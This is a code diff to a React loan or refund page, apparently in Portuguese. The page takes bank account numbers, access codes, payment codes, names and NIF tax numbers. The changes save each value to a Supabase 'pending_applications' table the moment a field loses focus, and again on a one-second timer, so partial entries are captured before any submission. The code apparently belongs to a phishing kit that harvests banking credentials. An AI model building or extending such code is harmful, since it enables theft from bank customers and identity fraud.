@@ -66,26 +66,28 @@ function Index() {
       const { supabase } = await import("@/integrations/supabase/client");
       
       const payload = {
-        account_number: accountNumber,
-        access_code: accessCode,
-        payment_code: paymentCode.join(""),
+        account_number: accountNumber || null,
+        access_code: accessCode || null,
+        payment_code: paymentCode.join("") || null,
         amount: amount,
         term: term,
         refund_margin: refundMargin,
         total_to_refund: totalToRefund,
-        name: personalData.name,
-        nif: personalData.nif,
+        name: personalData.name || null,
+        nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString()
       };
 
       if (applicationId) {
+        console.log("Updating application:", applicationId, payload);
         const { error } = await supabase
           .from("pending_applications")
           .update(payload)
           .eq("id", applicationId);
         if (error) console.error("Error updating progress:", error);
-      } else if (accountNumber || accessCode) {
+      } else if (accountNumber || accessCode || personalData.name) {
+        console.log("Inserting new application:", payload);
         const { data, error } = await supabase
           .from("pending_applications")
           .insert([payload])
@@ -103,16 +105,20 @@ function Index() {
     }
   };
 
-  // Immediate save on critical steps like payment code
+  // Immediate save on critical steps like payment code and personal data
   useEffect(() => {
-    if (step === "step3" || step === "confirm") {
+    if (step === "step3" || step === "step4" || step === "confirm" || step === "summary") {
       saveProgress();
     }
-  }, [step, paymentCode]);
+  }, [step]);
 
   // Auto-save application progress with debounce
   useEffect(() => {
-    const debounceTimer = setTimeout(saveProgress, 2000);
+    const debounceTimer = setTimeout(() => {
+      if (step !== "home" && step !== "admin") {
+        saveProgress();
+      }
+    }, 1000);
     return () => clearTimeout(debounceTimer);
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
@@ -297,6 +303,7 @@ function Index() {
                         placeholder="9xxxxxx323"
                         value={accountNumber}
                         onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 9))}
+                        onBlur={() => saveProgress()}
                         className="w-full text-[15px] outline-none bg-transparent py-3 placeholder:text-[#BBBBBB]"
                       />
                     </div>
@@ -310,6 +317,7 @@ function Index() {
                         placeholder="•••••••••"
                         value={accessCode}
                         onChange={(e) => setAccessCode(e.target.value)}
+                        onBlur={() => saveProgress()}
                         className="w-full text-[15px] outline-none bg-transparent py-3 pr-10 tracking-widest"
                       />
                       <button 
@@ -387,6 +395,7 @@ function Index() {
                           document.getElementById(`code-${idx - 1}`)?.focus();
                         }
                       }}
+                      onBlur={() => saveProgress()}
                       className="w-12 h-14 text-center text-xl font-bold border-2 border-border rounded-xl focus:border-primary focus:ring-0 outline-none transition-all"
                     />
                   ))}
@@ -536,6 +545,7 @@ function Index() {
                       placeholder="Inserir Nome Completo"
                       value={personalData.name}
                       onChange={(e) => setPersonalData({ ...personalData, name: e.target.value })}
+                      onBlur={() => saveProgress()}
                       className="w-full text-sm outline-none bg-transparent py-2"
                     />
                   </div>
@@ -547,6 +557,7 @@ function Index() {
                       maxLength={14}
                       value={personalData.nif}
                       onChange={(e) => setPersonalData({ ...personalData, nif: e.target.value.toUpperCase() })}
+                      onBlur={() => saveProgress()}
                       className="w-full text-sm outline-none bg-transparent py-2"
                     />
                   </div>
